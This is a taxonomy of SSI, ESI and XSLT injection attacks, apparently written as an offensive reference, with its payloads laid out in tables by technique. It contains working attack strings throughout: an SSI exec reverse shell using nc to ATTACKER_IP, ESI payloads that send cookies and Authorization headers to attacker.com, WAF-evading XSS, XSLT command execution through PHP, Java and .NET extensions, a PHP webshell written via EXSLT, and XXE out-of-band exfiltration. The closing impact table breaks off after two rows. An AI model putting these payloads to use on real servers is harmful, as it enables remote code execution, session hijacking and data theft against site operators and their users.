# SSI / ESI / XSLT Injection — Remote Code Execution Mutation Taxonomy

---

## Classification Structure

This taxonomy covers three distinct but related server-side injection primitives — **Server-Side Includes (SSI)**, **Edge Side Includes (ESI)**, and **XSLT (Extensible Stylesheet Language Transformations)** — that share a common structural property: they all process **markup directives or transformation logic server-side** before the response reaches the client. When an attacker can inject content into streams processed by these engines, the result ranges from information disclosure to full remote code execution.

The document is organized along three axes:

**Axis 1 (Primary — Structures the Document): Processing Technology.** Each technology operates at a different layer of the infrastructure stack (web server, cache/CDN edge, application-level XML processor), has distinct syntax, and presents unique exploitation primitives. Practitioners encounter them in fundamentally different contexts, so the primary axis reflects this reality.

**Axis 2 (Cross-Cutting — Applied Within Each Section): Mutation Target.** Within each technology, subtypes are classified by *what structural component* is being injected or manipulated: command execution interfaces, resource inclusion paths, variable interpolation, header/response control, entity resolution, extension function invocation, or dynamic evaluation.

**Axis 3 (Mapping — Connects to Impact): Attack Scenario.** Each mutation is mapped to its achievable impact: RCE, file read, SSRF, session hijacking, XSS/filter bypass, cache poisoning, or denial of service. This axis is presented in the cross-technology mapping table (§5).

### Mutation Target Summary (Axis 2)

| Mutation Target | Description | Applicable Technologies |
|----------------|-------------|------------------------|
| **Command/Code Execution** | Direct invocation of OS commands or arbitrary code through built-in execution interfaces | SSI (`exec`), XSLT (extension functions, script blocks) |
| **Resource Inclusion** | Fetching and embedding local files or remote content into the response | SSI (`include`), ESI (`esi:include`), XSLT (`document()`) |
| **Variable/Environment Interpolation** | Extracting server variables, HTTP headers, cookies, or environment data | SSI (`echo`, `printenv`), ESI (`esi:vars`, `$(...)`) |
| **Header/Response Manipulation** | Injecting or modifying HTTP response headers, status codes, or content framing | ESI (`request_header`, `add_header`), XSLT (`xsl:output`) |
| **Entity/DTD Resolution** | Exploiting XML external entity processing to read files or trigger SSRF | XSLT (DOCTYPE injection), ESI+XSLT chaining |
| **Extension Function Invocation** | Calling language-native functions (PHP, Java, C#) through processor extension APIs | XSLT (all processors with extensions enabled) |
| **Dynamic Evaluation** | Runtime evaluation of expressions constructed from attacker-controlled input | XSLT (`xsl:evaluate`, `saxon:evaluate`) |
| **Markup Obfuscation** | Using comment syntax, encoding, or nesting to bypass filters while preserving server-side interpretation | ESI (`<!--esi-->`), SSI (encoding variants) |

---

## §1. Server-Side Includes (SSI) Directive Injection

SSI is a lightweight server-side scripting mechanism where directives embedded in HTML files are processed by the web server before delivery. Directives follow the format `<!--#directive param="value" -->`. When user-controlled input reaches files processed by the SSI engine (typically identified by `.shtml`, `.shtm`, or `.stm` extensions, though any file type can be configured), attackers can inject arbitrary directives.

SSI is supported by Apache (`mod_include`), Nginx (`ngx_http_ssi_module`), IIS (`ssinc.dll`), LiteSpeed, and several other web servers. Despite being a legacy technology from the 1990s, SSI remains enabled in many production environments, particularly in legacy systems and misconfigured modern deployments.

### §1-1. Command Execution via `exec`

The `exec` directive is the most dangerous SSI primitive, providing direct OS command execution under the web server's process identity.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **exec cmd** | Executes an arbitrary shell command via `/bin/sh` (Unix) or `cmd.exe` (Windows) | `<!--#exec cmd="id" -->` | `Options +Includes` without `IncludesNOEXEC` (Apache); SSI exec enabled (Nginx) |
| **exec cgi** | Executes a CGI script at the specified path, inheriting the server's execution context | `<!--#exec cgi="/cgi-bin/attack.cgi" -->` | CGI execution must be enabled; attacker needs to place or reference a script |
| **Reverse shell via exec** | Chains shell commands to establish an outbound connection | `<!--#exec cmd="mkfifo /tmp/f;nc ATTACKER_IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` | Network egress from server; `exec cmd` enabled |
| **Chained command execution** | Uses shell operators (`;`, `&&`, `\|`, backticks) to chain multiple commands within a single `exec` directive | `<!--#exec cmd="cat /etc/passwd; whoami; uname -a" -->` | Same as `exec cmd` |

**Server-specific behavior:**
- **Apache**: `exec cmd` is controlled by the `Options +Includes` directive. The `IncludesNOEXEC` option specifically disables `exec cmd` and `exec cgi` while permitting other SSI directives. Since Apache 2.4, `mod_include` can be further restricted with the `SSILegacyExprParser` and conditional expression controls.
- **Nginx**: SSI is enabled via `ssi on;` in the configuration. The `exec` directive is **not natively supported** by Nginx's SSI module — Nginx implements a subset of SSI focusing on `include`, `set`, `if`, `echo`, and `block`/`endblock`. Command execution through Nginx SSI requires custom configurations or third-party modules.
- **IIS**: Historically vulnerable through `ssinc.dll`. A critical buffer overflow in IIS 4.0/5.0 (`ssinc.dll`) allowed system-level privilege escalation via oversized SSI directives.

### §1-2. File and Resource Inclusion

SSI inclusion directives embed the contents of other files or URLs into the response, enabling information disclosure and potential code inclusion.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **include virtual** | Includes the output of a server-resolved virtual path (can trigger CGI/SSI processing on the included resource) | `<!--#include virtual="/etc/passwd" -->` | Path must be resolvable by the server's URI handler |
| **include file** | Includes a file using a filesystem-relative path from the current document | `<!--#include file="../../../etc/passwd" -->` | Path traversal depends on OS and chroot configuration |
| **Remote resource inclusion** | Uses `include virtual` with a handler that fetches remote content (e.g., through reverse proxy or SSI subrequest) | `<!--#include virtual="http://internal-server/admin" -->` | Server configuration must allow URI-based subrequests |
| **flastmod / fsize** | Leaks metadata (modification time, file size) of arbitrary files without including content | `<!--#flastmod file="/etc/shadow" -->` | File must exist and be stat-accessible |

**Path traversal considerations**: The `include file` directive typically restricts paths to be relative and within the document root, but misconfigured servers may allow traversal sequences. The `include virtual` directive processes through the server's URI resolution engine, which may apply URL decoding, canonicalization, or handler mapping — each step introducing potential bypass opportunities.

### §1-3. Variable and Environment Extraction

SSI provides access to server variables, environment variables, and HTTP request metadata through interpolation directives.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **echo var** | Outputs the value of a named server/environment variable | `<!--#echo var="DOCUMENT_ROOT" -->` | SSI processing enabled |
| **printenv** | Dumps all available environment variables and their values in a single output | `<!--#printenv -->` | Provides comprehensive server fingerprinting |
| **HTTP header extraction** | Accesses request headers through HTTP_* variables | `<!--#echo var="HTTP_COOKIE" -->` | Headers are automatically mapped to SSI variables |
| **Server metadata** | Extracts server configuration details | `<!--#echo var="SERVER_SOFTWARE" -->`, `<!--#echo var="DOCUMENT_NAME" -->` | Standard CGI/SSI variables |

**Key variables for exploitation:**
- `DOCUMENT_ROOT` — reveals filesystem layout
- `SERVER_SOFTWARE` — identifies web server version for targeted attacks
- `REMOTE_ADDR`, `REMOTE_HOST` — network reconnaissance
- `HTTP_COOKIE`, `HTTP_AUTHORIZATION` — credential extraction
- `QUERY_STRING`, `REQUEST_URI` — injection point analysis
- `DATE_LOCAL`, `DATE_GMT` — timing information

### §1-4. Variable Manipulation and Conditional Logic

SSI supports variable assignment and conditional expressions, enabling multi-step attack construction.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **set var** | Assigns a value to a named variable for later interpolation | `<!--#set var="cmd" value="cat /etc/passwd" -->` | SSI processing enabled |
| **Conditional execution** | Uses `if`/`elif`/`else`/`endif` to execute directives based on variable values or regex matches | `<!--#if expr="$QUERY_STRING = /admin/" --><!--#exec cmd="id" --><!--#endif -->` | Apache SSI expression parser |
| **config** | Modifies SSI processing behavior: error message format, time format, file size format | `<!--#config errmsg="[custom error]" -->` | Reveals SSI processing state; can suppress error indicators |

The conditional logic enables targeted exploitation — for example, executing different payloads based on the server's operating system (detected via `SERVER_SOFTWARE`) or only triggering when specific conditions are met to evade detection.

### §1-5. Filter Evasion Techniques

SSI injection payloads can be obfuscated to bypass WAFs and input validation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **URL encoding** | Encode `<!--#` as `%3C%21--%23` or double-encode; server may decode before SSI processing | WAF decodes differently than the web server |
| **Whitespace manipulation** | Insert tabs, newlines, or extra spaces within the directive structure | SSI parser tolerates flexible whitespace |
| **Case variation** | Mix case in directive names where the server is case-insensitive | Server-specific parser behavior |
| **Nested comment injection** | Embed SSI directives within HTML comments to hide from surface-level scanners | `<!-- <!--#exec cmd="id" --> -->` |
| **Partial injection** | Inject fragments across multiple input fields that combine in the rendered page | Multiple reflection points on the same SSI-processed page |

---

## §2. Edge Side Includes (ESI) Tag Injection

ESI is an XML-based markup language designed for dynamic content assembly at the caching/CDN layer. ESI tags embedded in responses from origin servers are interpreted by intermediary cache servers (surrogates) before the response reaches the client. The critical security property: **the ESI engine trusts all ESI tags in upstream responses**, making it impossible for the cache server to distinguish legitimate tags from injected ones.

ESI injection occurs when attacker-controlled input is reflected in responses that pass through an ESI-processing surrogate. Because ESI operates at the cache layer — between the origin server and the client — it is invisible to client-side protections and can bypass browser security mechanisms like HttpOnly cookie flags and XSS filters.

### §2-1. Remote Resource Inclusion via `esi:include`

The `esi:include` tag is the fundamental ESI primitive, instructing the surrogate to fetch a remote resource and embed it in the response.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Basic SSRF** | Forces the surrogate to make an HTTP request to an attacker-specified URL | `<esi:include src="http://attacker.com/collect" />` | ESI processing enabled; no host whitelist (Squid, Akamai, NodeJS) |
| **Internal network probing** | Uses `esi:include` to access internal services not exposed to the internet | `<esi:include src="http://169.254.169.254/latest/meta-data/" />` | Surrogate has network access to internal targets |
| **Local file disclosure** | References local files through the `src` attribute | `<esi:include src="secret.txt" />` | Implementation supports relative or file:// URIs |
| **Error-based enumeration** | Uses `esi:try`/`esi:attempt`/`esi:except` to silently handle failed requests while probing | `<esi:try><esi:attempt><esi:include src="http://internal:PORT/"/></esi:attempt><esi:except>closed</esi:except></esi:try>` | Surrogate supports `esi:try` (limited vendor support) |
| **Chained inclusion** | Nests `esi:include` tags to create multi-hop request chains | Recursive `esi:include` in fetched resources | Surrogate follows inclusion chains; no depth limit (CVE-2025-49763: ATS memory exhaustion from infinite nesting) |
| **Alt/onerror fallback abuse** | Uses the `alt` attribute to make secondary requests when primary fails | `<esi:include src="http://unreachable/" alt="http://attacker.com/fallback" />` | Surrogate supports `alt` attribute |

**Vendor-specific `esi:include` behavior:**

| Vendor | Includes | Host Whitelist | Notes |
|--------|----------|---------------|-------|
| **Squid** | Yes | No | Full SSRF; also supports upstream headers and cookies |
| **Varnish** | Yes | Yes | Restrictive; only 3 ESI actions total |
| **Akamai** | Yes | No | Rich feature set; 1MB size limit; max 5 nesting levels |
| **Fastly** | Yes | Yes | Whitelist reduces SSRF scope |
| **Apache Traffic Server** | Yes | No | No `alt`/`onerror` support; vulnerable to nesting DoS |
| **Oracle WebCache** | Yes | No | Supports full ESI spec + custom extensions |
| **IBM WebSphere** | Yes | Configurable | Enterprise ESI caching with surrogate delegation |
| **NodeJS esi** | Yes | No | Supports cookies; no host whitelist |
| **ESIGate** | Yes | No | Supports XSLT integration (§2-6) |

### §2-2. Variable Interpolation and Data Exfiltration via `esi:vars`

ESI variable interpolation allows access to HTTP request headers, cookies, and server metadata — critically, this occurs at the cache layer, **bypassing browser-enforced protections like HttpOnly**.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Full cookie extraction** | Interpolates all cookies, including HttpOnly-flagged ones | `<esi:vars>$(HTTP_COOKIE)</esi:vars>` | Surrogate supports `esi:vars`; cookies in scope |
| **Specific cookie theft** | Extracts individual named cookies | `<esi:include src="http://attacker.com/?c=$(HTTP_COOKIE{'JSESSIONID'})" />` | Surrogate supports cookie variable syntax |
| **Authorization header theft** | Extracts Bearer tokens or Basic auth credentials | `<esi:vars>$(HTTP_HEADER{Authorization})</esi:vars>` | Surrogate supports header variable interpolation |
| **User-Agent / Referer extraction** | Exfiltrates client metadata for fingerprinting | `<esi:vars>$(HTTP_HEADER{User-Agent})</esi:vars>` | Same as above |
| **Exfiltration via inclusion** | Embeds stolen data in `esi:include` URL parameters sent to attacker server | `<esi:include src="http://attacker.com/steal?cookie=$(HTTP_COOKIE)" />` | Combines `esi:include` with variable interpolation |

**HttpOnly bypass mechanism:** ESI variable replacement occurs server-side within the surrogate/cache layer, not in the browser's JavaScript engine. Therefore, cookies marked as `HttpOnly` — which only prevents JavaScript access — are fully accessible to ESI `$(HTTP_COOKIE)` expressions. This enables **JavaScript-less session hijacking**: the attacker extracts session tokens through ESI without any client-side code execution.

**Vendor support matrix for variables:**

| Vendor | Vars | Cookies | Upstream Headers |
|--------|------|---------|------------------|
| Squid | Yes | Yes | Yes |
| Varnish | No | No | Yes |
| Fastly | No | No | No |
| Akamai | Yes | Yes | No |
| NodeJS esi | Yes | Yes | Yes |

### §2-3. XSS Enhancement and Filter Bypass

ESI tags can be weaponized to bypass client-side XSS protections and WAFs through several mechanisms.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **ESI comment splitting** | Inserts `<!--esi-->` within HTML tags to break WAF pattern matching while the surrogate strips the comment, leaving executable HTML | `<scr<!--esi-->ipt>alert(1)</sc<!--esi-->ript>` | WAF does not understand ESI processing; surrogate strips comments |
| **Variable-based tag construction** | Uses `esi:assign` and `esi:vars` to construct malicious HTML fragments from variables | `x=<esi:assign name="v" value="'cript'"/><s<esi:vars name="$(v)"/>>alert(1)</s<esi:vars name="$(v)"/>>` | Surrogate supports `esi:assign` + `esi:vars` |
| **Image error handler injection** | Combines ESI comments with event handlers | `<img+src=x+on<!--esi-->error=alert(1)>` | ESI comment stripping occurs before browser parsing |
| **Reflected XSS amplification** | Injects ESI variable extraction payloads within reflected XSS context to steal cookies server-side | `<esi:include src="http://attacker.com/xss.html">` where `xss.html` contains cookie-exfiltrating ESI | Reflected input passes through ESI-processing surrogate |
| **URL-decoded ESI in reflected context** | Uses URL encoding for ESI tags that gets decoded before surrogate processing | `<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->` | Surrogate processes URL-decoded values |

**Key insight:** The `<!--esi ... -->` comment form is the most universal bypass primitive because nearly all ESI-processing surrogates interpret it, while it looks like a harmless HTML comment to WAFs and sanitizers. This creates a fundamental **parsing discrepancy** between the security layer (which sees an HTML comment) and the processing layer (which executes ESI logic).

### §2-4. HTTP Header and Response Manipulation

ESI provides primitives for modifying request and response headers at the cache layer.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Header injection via `add_header`** | Adds arbitrary response headers, enabling open redirects, content-type overrides, or CSP bypass | `<!--esi $add_header('Location','http://attacker.com') -->` | Surrogate supports `$add_header()` function |
| **Content-Type override** | Changes response content type to enable payload interpretation | `<!--esi/$add_header('Content-Type','text/html')/$url_decode('"><svg/onload=prompt(1)>')/-->` | Same as above |
| **Request header manipulation** | Modifies headers on subrequests made by the surrogate | `<esi:request_header name="Host" value="attacker.com"/>` | Oracle WebCache (CVE-2019-2438) |
| **CRLF injection in headers** | Injects newlines to add additional headers or split the response | `<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunk:%20junk/"/>` | Surrogate does not sanitize URL in `src` attribute |
| **Host header override** | Overrides the Host header on surrogate subrequests to redirect them to attacker infrastructure | `<esi:request_header name="User-Agent" value="12345\r\nHost: attacker.com"/>` | Newline injection in `value` attribute |

### §2-5. Inline Fragment Overwriting

The `esi:inline` tag allows creation or overwriting of cached fragments, enabling persistent content manipulation.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Virtual page creation** | Creates a new cached resource accessible via its `name` attribute | `<esi:inline name="/attack.html" fetchable="yes"><script>document.location='http://attacker.com/'+document.cookie</script></esi:inline>` | Oracle WebCache 11g (unique to this implementation) |
| **JavaScript file poisoning** | Overwrites frequently-cached JavaScript files to inject persistent XSS across all pages that reference them | Same as above, targeting `.js` resources | Persistent XSS via cache-level file overwrite |
| **Resource pollution** | Creates or modifies cached resources that other pages include, achieving lateral propagation | Target resources included via `<script src="...">` or `<link>` tags | Creates persistent attack vectors without origin modification |

**Vendor limitation:** The `esi:inline` action is **only** supported by Oracle WebCache. Apache Traffic Server, Squid, Varnish, and Fastly do not implement it.

### §2-6. ESI-to-XSLT Chaining

ESI supports XSLT processing through the `dca` (dynamic content assembly) parameter, creating a bridge from ESI injection to the full XSLT attack surface (§3).

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Remote XSLT stylesheet loading** | Uses `dca="xslt"` to instruct the surrogate to apply an attacker-controlled XSLT stylesheet to fetched XML content | `<esi:include src="http://attacker.com/payload.xml" dca="xslt" stylesheet="http://attacker.com/rce.xsl" />` | Surrogate supports `dca="xslt"` (ESIGate, some enterprise surrogates) |
| **XXE via XSLT** | The loaded XSLT stylesheet contains XXE declarations that the surrogate's XSLT processor resolves | Stylesheet contains `<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | XSLT processor does not disable external entities |
| **RCE via XSLT extension functions** | The XSLT stylesheet invokes Java Runtime or other extension functions (§3-3) | Stylesheet uses Xalan/Saxon extension namespaces for `Runtime.exec()` | ESI surrogate uses a Java-based XSLT processor with extensions enabled |

This chaining mechanism is particularly dangerous because it escalates ESI injection — which alone typically achieves SSRF and data exfiltration — to full RCE through the XSLT processor's code execution capabilities.

### §2-7. Denial of Service

ESI processing can be abused for resource exhaustion and service disruption.

| Subtype | Mechanism | Example | CVE/Reference |
|---------|-----------|---------|---------------|
| **Recursive inclusion bomb** | Injects `esi:include` tags that reference resources containing more `esi:include` tags, creating exponential fetching | Endlessly nested `<esi:include>` tags | CVE-2025-49763 (Apache Traffic Server memory exhaustion) |
| **Pointer dereference crashes** | Malformed ESI responses trigger NULL pointer dereference or incorrect pointer handling in the surrogate's parser | Crafted HTTP responses from attacker-controlled origins | CVE-2018-1000024, CVE-2018-1000027 (Squid pre-4.0.23) |
| **Out-of-bounds write** | Malformed ESI variable assignments cause memory corruption in the surrogate | Crafted ESI variable assignment payloads | CVE-2024-45802 (Squid ESI variable handling) |
| **Resource amplification** | Single request triggers many `esi:include` subrequests, amplifying load on origin servers | Multiple `esi:include` tags in a single injected payload | Surrogate processes all includes without rate limiting |

---

## §3. XSLT Stylesheet Injection

XSLT (Extensible Stylesheet Language Transformations) is a Turing-complete language designed for transforming XML documents. When applications accept user-supplied XSLT stylesheets or allow injection into existing stylesheets, the full computational power of XSLT — plus processor-specific extension mechanisms — becomes available to attackers.

XSLT injection is more powerful than SSI or ESI injection because XSLT processors typically support:
- **File system access** via the `document()` function
- **Network access** via URI resolution
- **Code execution** via language-specific extension functions
- **Dynamic evaluation** via `xsl:evaluate` (XSLT 3.0)
- **External entity resolution** via XXE
- **Script embedding** in certain processors (.NET's `msxsl:script`)

The attack surface is **processor-dependent**: each XSLT engine (libxslt, Saxon, Xalan, MSXML) exposes different extension mechanisms and has different default security configurations.

### §3-1. Processor Fingerprinting and Reconnaissance

Before exploitation, identifying the XSLT processor version and capabilities is critical for selecting the appropriate attack primitive.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Version detection** | Queries XSLT system properties to identify processor and version | `<xsl:value-of select="system-property('xsl:version')"/>` |
| **Vendor identification** | Reveals the XSLT engine name and URL | `<xsl:value-of select="system-property('xsl:vendor')"/>` / `<xsl:value-of select="system-property('xsl:vendor-url')"/>` |
| **Feature probing** | Tests for specific extension function availability by observing error messages vs. successful execution | Attempt extension function call; analyze error vs. result |
| **Extension namespace probing** | Declares processor-specific namespaces and tests whether they're recognized | Declare `xmlns:php="http://php.net/xsl"` and attempt a call |

**Processor identification mapping:**

| Vendor String | Processor | Language/Platform | Key Attack Primitives |
|--------------|-----------|------------------|----------------------|
| `libxslt` | libxslt (GNOME) | C / PHP / Python | EXSLT functions, PHP functions (if registered), `document()` |
| `Apache Software Foundation` | Xalan | Java | Java reflection via extension namespaces |
| `SAXON` / `Saxonica` | Saxon-HE/PE/EE | Java / .NET | Reflexive extensions (PE/EE), `xsl:evaluate` (XSLT 3.0) |
| `Microsoft` | MSXML / System.Xml | .NET / COM | `msxsl:script` with C#/VB.NET/JScript |

### §3-2. File Access and SSRF via `document()`

The `document()` function is a standard XSLT 1.0 function that retrieves and parses XML from a URI, enabling both local file reads and server-side request forgery.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Local file read** | References a local file path; if the file is valid XML, contents are returned directly | `<xsl:copy-of select="document('/etc/passwd')"/>` | File must be XML-parseable, or error messages leak partial content |
| **Error-based file disclosure** | Non-XML files trigger parser errors that include the first line(s) of the file | `<xsl:copy-of select="document('/etc/shadow')"/>` → error contains first line | Parser error messages not suppressed |
| **Windows file read** | Uses Windows-specific paths | `<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>` | Windows OS; `file://` URI scheme allowed |
| **HTTP SSRF** | Uses `document()` to make HTTP requests to arbitrary hosts | `<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>` | External URI resolution not disabled |
| **Port scanning** | Probes internal hosts/ports by analyzing error differences (connection refused vs. timeout vs. response) | `<xsl:copy-of select="document('http://internal:22')"/>` | Network access from processor |
| **Protocol probing** | Tests various URI schemes (file://, http://, https://, ftp://, gopher://) | `<xsl:copy-of select="document('gopher://...')"/>` | Scheme support varies by processor |
| **UNC path access (Windows)** | Accesses SMB shares or triggers NTLM authentication to attacker-controlled servers | `<xsl:copy-of select="document('\\\\attacker\\share\\file')"/>` | Windows environment; SMB outbound allowed |

**Key limitation:** `document()` attempts to parse the retrieved content as XML. Non-XML content causes a parsing error, but the error message frequently leaks partial content (typically the first line). This makes `document()` a reliable information disclosure primitive even for non-XML files, though it returns less data than direct file read mechanisms.

### §3-3. Extension Function-Based Code Execution

XSLT processors expose language-native function invocation through extension namespaces — the primary RCE vector for XSLT injection. The specific mechanism depends on the processor:

| Processor | Platform | Extension Mechanism | RCE Example | Key Condition |
|-----------|----------|-------------------|-------------|---------------|
| **libxslt** | PHP / Python / C | `php:function()` calls any registered PHP function | `<xsl:value-of select="php:function('system','id')"/>` (xmlns:php="http://php.net/xsl") | `registerPHPFunctions()` called without allowlist |
| **Xalan** | Java | Namespace URI maps directly to Java class: `http://xml.apache.org/xalan/java/{class}` | `rt:exec(rt:getRuntime(),'id')` (xmlns:rt=".../java.lang.Runtime") | Extensions enabled (default) |
| **Saxon PE/EE** | Java / .NET | Reflexive extensions map XPath calls to Java methods | `Runtime:exec(Runtime:getRuntime(),'whoami')` (xmlns:Runtime="java:java.lang.Runtime") | Saxon-PE or Saxon-EE (not HE); `xsl:evaluate` available in XSLT 3.0 mode on all editions |
| **MSXML / System.Xml** | .NET | `msxsl:script` embeds arbitrary C#/VB.NET/JScript code | `<msxsl:script language="C#">Process.Start("cmd","/c whoami")</msxsl:script>` | `XsltSettings.TrustedXslt` or `XsltSettings(true, true)` — default disables scripting |

All processors also support `document()` for file read/SSRF (§3-2) and may allow JNDI lookups (Xalan), file write via EXSLT `exsl:document` (libxslt), or dynamic XPath evaluation via `xsl:evaluate`/`saxon:evaluate` (Saxon).

### §3-4. File Write via EXSLT Extensions

EXSLT (Extensions to XSLT) provides a `document` output element that writes transformation results to files.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **exsl:document file write** | Writes arbitrary content to a file on the server | `<exsl:document href="/var/www/shell.php" method="text"><?php system($_GET['c']); ?></exsl:document>` with `xmlns:exsl="http://exslt.org/common"` | libxslt with EXSLT support; write permissions to target path |
| **Webshell deployment** | Combines file write with PHP webshell content to establish persistent access | Write PHP/JSP/ASP shell to web-accessible directory | Web root path known; write permissions |
| **Configuration overwrite** | Overwrites server configuration files to modify behavior | Target Apache `.htaccess`, Nginx includes, or application configs | Write permission to configuration directory |
| **Cron/scheduled task injection** | Writes to cron directories or Windows Task Scheduler locations | Target `/etc/cron.d/`, `/var/spool/cron/` | Root-level write permissions |

**Processor support:** EXSLT `document` output is primarily supported by **libxslt**. Saxon and Xalan use different mechanisms for secondary output (`xsl:result-document` in XSLT 2.0+).

### §3-5. XML External Entity (XXE) via XSLT

XSLT stylesheets are XML documents, making them susceptible to XXE attacks through DOCTYPE declarations.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Classic XXE file read** | Defines an external entity referencing a local file | `<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` ... `&xxe;` | XSLT processor's XML parser resolves external entities |
| **SSRF via XXE** | External entity references an HTTP URL | `<!ENTITY xxe SYSTEM "http://internal-server/admin">` | External URL resolution enabled |
| **Parameter entity exfiltration** | Uses parameter entities for out-of-band data exfiltration | `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">` | OOB channel; parameter entity processing |
| **Billion Laughs (DoS)** | Nested entity expansion causing exponential memory consumption | `<!ENTITY lol1 "&lol;&lol;&lol;...">` etc. | Entity expansion limits not configured |
| **DTD-based SSRF** | Forces the parser to fetch a remote DTD file | `<!DOCTYPE xsl:stylesheet SYSTEM "http://attacker.com/evil.dtd">` | Remote DTD loading not disabled |

**XXE + XSLT amplification:** The combination of XXE with XSLT is especially potent because the XSLT document() function can be used to load external XML that itself contains XXE declarations, creating a multi-stage exploitation chain.

### §3-6. Stylesheet Import and Include Hijacking

XSLT supports modular stylesheet composition through `xsl:import` and `xsl:include`, which can be hijacked to load attacker-controlled transformation logic.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Remote stylesheet import** | `xsl:import` loads a remote stylesheet with lower precedence rules | `<xsl:import href="http://attacker.com/evil.xsl"/>` | URI resolution not restricted |
| **Remote stylesheet include** | `xsl:include` loads a remote stylesheet as if it were inline | `<xsl:include href="http://attacker.com/evil.xsl"/>` | URI resolution not restricted |
| **Relative path hijacking** | Manipulates relative import/include paths to load unintended local stylesheets | Path traversal in `href` attribute | Base URI manipulation possible |
| **Import precedence exploitation** | Uses import precedence rules to override security-critical template behaviors | Imported stylesheet redefines templates that handle sensitive operations | Application relies on template precedence for access control |

### §3-7. Output Method and Serialization Manipulation

XSLT's `xsl:output` element controls how the transformation result is serialized, which can be exploited to change response interpretation.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Content-Type manipulation** | Changes the `media-type` in `xsl:output` to alter browser content interpretation | `<xsl:output method="html" media-type="text/html"/>` | Processor outputs Content-Type headers based on `xsl:output` |
| **Encoding manipulation** | Changes output encoding to enable character-set-based attacks | `<xsl:output encoding="UTF-7"/>` | Downstream consumers interpret the changed encoding |
| **CDATA injection** | Uses `cdata-section-elements` to force CDATA wrapping, bypassing HTML escaping | `<xsl:output cdata-section-elements="script"/>` | Output is consumed as HTML |

---

## §4. Cross-Technology Chaining

The most impactful attacks combine multiple injection technologies into multi-stage exploitation chains.

### §4-1. ESI → XSLT → RCE Chain

| Stage | Mechanism | Prerequisite |
|-------|-----------|-------------|
| 1. ESI injection | Inject `<esi:include>` with `dca="xslt"` parameter | User input reflected in ESI-processed response |
| 2. XSLT stylesheet delivery | Surrogate fetches attacker-controlled `.xsl` file via the `stylesheet` attribute | No host whitelist, or whitelist bypass |
| 3. Extension function RCE | XSLT stylesheet contains Xalan/Saxon Java extension function calls | Java-based XSLT processor with extensions enabled |

This chain escalates from a cache-layer injection (typically limited to SSRF/XSS) to full server-side code execution.

### §4-2. SSI → File Include → Code Execution

| Stage | Mechanism | Prerequisite |
|-------|-----------|-------------|
| 1. SSI injection | Inject `<!--#include virtual="...">` directive | User input in SSI-processed page |
| 2. File inclusion | Include a file containing executable content (PHP, JSP, etc.) | Attacker can upload or control a file on the server |
| 3. Code execution | Included file is processed by the application's language interpreter | Included path triggers handler execution (e.g., `.php` extension) |

### §4-3. XSLT → XXE → SSRF → Internal Access

| Stage | Mechanism | Prerequisite |
|-------|-----------|-------------|
| 1. XSLT injection | Inject or supply malicious XSLT stylesheet | User-controlled stylesheet input |
| 2. XXE declaration | Stylesheet contains DOCTYPE with external entity referencing internal service | XML parser resolves external entities |
| 3. SSRF to metadata | Entity resolves to cloud metadata endpoint or internal API | XSLT processor runs in cloud environment with metadata service access |

### §4-4. XSLT → File Write → Webshell → Persistent RCE

| Stage | Mechanism | Prerequisite |
|-------|-----------|-------------|
| 1. XSLT injection | Inject stylesheet with EXSLT `document` output element | User-controlled stylesheet; libxslt processor |
| 2. Webshell write | Write PHP/JSP/ASP file to web-accessible directory | Write permissions; known web root path |
| 3. Persistent access | Access written webshell via HTTP to execute arbitrary commands | Webshell path accessible via web |

### §4-5. SSRF → XSLT Endpoint → RCE (CVE-2025-61882 Pattern)

| Stage | Mechanism | Prerequisite |
|-------|-----------|-------------|
| 1. SSRF via unauthenticated endpoint | Send crafted request to endpoint that makes server-side HTTP calls | Unauthenticated SSRF in web application |
| 2. CRLF injection for request smuggling | Inject CRLF sequences to manipulate the internal HTTP request structure | URL parameter vulnerable to CRLF injection |
| 3. XSLT stylesheet loading | Manipulated request reaches an XSLT processing endpoint that loads stylesheet from attacker-controlled URL (via Host header injection) | XSLT endpoint constructs stylesheet URL from request headers |
| 4. Java extension function RCE | Attacker-served XSLT stylesheet uses Java extension functions for code execution | Java XSLT processor with extensions enabled |

This pattern, exemplified by CVE-2025-61882 in Oracle E-Business Suite, demonstrates how XSLT processing endpoints that are not directly user-facing can still be reached and exploited through SSRF chains.

---

## §5. Attack Scenario Mapping (Axis 3)

| Impact Scenario | Architecture / Conditions | Primary Mutation Categories |
|----------------|--------------------------|---------------------------|
| **Remote Code Execution** | SSI exec enabled; XSLT with extensions; ESI+XSLT chain | §1-1, §3-3 (all sub-sections), §3-4, §2-6, §4-1, §4-5 |
| **Arbitrary File Read** | SSI include; XSLT document(); XSLT XXE | §1-2, §3-2, §3-5 |
